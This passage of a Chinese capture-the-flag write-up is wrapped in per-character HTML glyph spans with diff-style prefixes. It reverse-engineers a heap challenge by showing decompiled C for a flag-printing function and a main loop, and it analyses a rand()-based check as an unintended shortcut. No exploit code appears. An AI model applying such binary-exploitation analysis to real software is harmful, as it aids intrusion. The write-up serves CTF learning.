cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-464px">最</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-432px">放</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-320px">弃</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span>……
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-48px">但</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-336px">很</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-368px">意</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-224px">外</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-784px">见</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-864px">通</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-848px">过</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-864px">逆</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-160px">向</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-112px">分</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-480px">析</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-704px">给</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-928px">非</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-928px">预</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-480px">期</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-464px">最</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-688px">简</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-144px">单</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-752px">草</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-464px">最</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-864px">近</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-336px">很</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-224px">多</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-640px">目</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-880px">都</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-160px">向</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-400px">指</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-976px">：</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-352px">急</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-640px">着</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-336px">怎</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-112px">利</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-720px">而</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-224px">多</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-720px">考</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-720px">考</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-48px">伪</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-48px">代</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-640px">码</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-176px">和</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-528px">汇</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-720px">编</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-800px">话</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-800px">说</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-240px">奇</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-864px">迹</span>……
+
+Anyway<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-880px">道</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-256px">官</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-448px">方</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> largebin attack<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-752px">草</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-320px">当</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-448px">时</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-256px">完</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-80px">全</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-832px">跑</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-80px">偏</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-896px">问</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-240px">大</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-80px">先</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-224px">复</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-864px">逆</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-160px">向</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-112px">分</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-480px">析</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-672px">等</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-256px">学</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-256px">完</span> largebin <span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-96px">再</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-240px">头</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-928px">预</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-480px">期</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-880px">道</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-176px">吧</span>……
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-864px">逐</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-128px">功</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-864px">进</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-144px">去</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-496px">查</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span> `launch_starship` <span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-384px">打</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-320px">开</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-304px">并</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span> flag <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-96px">内</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-272px">容</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-976px">：</span>
+
+```c
+unsigned __int64 launch_starship()
+{
+  size_t n; // rax
+  int fd; // [rsp+Ch] [rbp-94h]
+  char s[136]; // [rsp+10h] [rbp-90h] BYREF
+  unsigned __int64 v4; // [rsp+98h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(s, 0, 0x80u);
+  fd = open(&quot;flag.txt&quot;, 0);
+  if ( fd == -1 )
+  {
+    fwrite(&quot;Error: open failedn&quot;, 1u, 0x13u, stderr);
+    exit(1);
+  }
+  read(fd, s, 0x80u);
+  close(fd);
+  *(_WORD *)&amp;s[strlen(s)] = 10;
+  n = strlen(s);
+  write(1, s, n);
+  return v4 - __readfsqword(0x28u);
+}
+```
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> main <span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-112px">函</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-976px">：</span>
+
+```c ins={37-38, 51-56}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int seed; // eax
+  int v4; // eax
+  int n5; // [rsp+Ch] [rbp-14h] BYREF
+  unsigned int v7; // [rsp+10h] [rbp-10h]
+  int char; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v9; // [rsp+18h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stderr, 0, 2, 0);
+  puts(&quot;Your starship have been wandering for weeks in this derelict orbit, whos
+e core is out of energy.&quot;);
+  puts(&quot;You are the last engineer who must ignite the core with energy using pro
+per modules.&quot;);
+  puts(&quot;Power up the starship. Or stay stranded forever.&quot;);
+  seed = time(0);
+  srand(seed);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      putchar(10);
+      puts(&quot;[1] Create a module&quot;);
+      puts(&quot;[2] Delete a module&quot;);
+      puts(&quot;[3] Edit a module&quot;);
+      puts(&quot;[4] Power up&quot;);
+      puts(&quot;[5] Stay stranded&quot;);
+      printf(&quot;&gt;&gt; &quot;);
+      if ( (unsigned int)__isoc99_scanf(&quot;%d&quot;, &amp;n5) == 1 &amp;&amp; n5 &gt; 0 &amp;&amp; n5 &lt;= 5 )
+        break;
+      puts(&quot;Invalid choice!&quot;);
+      do
+        char = getchar();
+      while ( char != 10 &amp;&amp; char != -1 );
+    }
+    v4 = rand();
+    v7 = (unsigned __int8)(((unsigned int)(v4 &gt;&gt; 31) &gt;&gt; 24) + v4) - ((unsigned i
+nt)(v4 &gt;&gt; 31) &gt;&gt; 24);
+    switch ( n5 )
+    {
+      case 1:
+        create_module();
+        break;
+      case 2:
+        delete_module();
+        break;
+      case 3:
+        edit_module();
+        break;
+      case 4:
+        if ( (unsigned __int8)(16 * BYTE1(energy)) | (unsigned __int64)(((energy
+ &gt;&gt; 4) &amp; 0xF) == v7) )
+        {
+          puts(&quot;The core is full of energy to power up the starship!&quot;);
+          launch_starship();
+          exit(0);
+        }
+        puts(&quot;The core is still dead as a rock without energy!&quot;);
+        break;
+      case 5:
+        puts(&quot;You and your starship will stay stranded in deep space forever!&quot;);
+        exit(1);
+      default:
+        continue;
+    }
+  }
+}
+```
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-384px">手</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-432px">撕</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-528px">注</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-368px">意</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span> `v4` <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-864px">通</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-848px">过</span> `rand` <span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-608px">生</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-368px">成</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-48px">伪</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-912px">随</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-112px">函</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-752px">范</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-208px">围</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> $[ 
+0,RAND_MAX]$ <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-720px">而</span> `v7` <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-784px">表</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-848px">达</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`(unsigned __int8)(((unsigned int)(v4 &gt;&gt; 31) &gt;&gt; 24) + v4) - 
+((unsigned int)(v4 &gt;&gt; 31) &gt;&gt; 24)`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-928px">需</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-544px">深</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-672px">究</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-320px">底</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-32px">什</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-368px">意</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-208px">因</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-304px">并</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-224px">复</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-480px">杂</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-544px">消</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-928px">项</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-192px">嘛</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-976px">～</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:0px">两</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-880px">部</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-112px">分</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-640px">相</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-160px">同</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> `(unsigned int)(v4 &gt;&gt; 31) &gt;&gt; 24)`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-720px">而</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-96px">减</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-160px">号</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-288px">左</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-848px">边</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-512px">比</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-160px">右</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-848px">边</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-160px">只</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-224px">多</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-128px">加</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span> `v4` <span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-720px">罢</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-880px">那</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-240px">如</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-496px">果</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-336px">得</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> `v4` <span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-512px">正</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-240px">好</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> 0 <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-800px">话</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-448px">整</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span> `v7` 
+<span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-784px">表</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-848px">达</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-704px">结</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-496px">果</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> 0<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-880px">都</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span 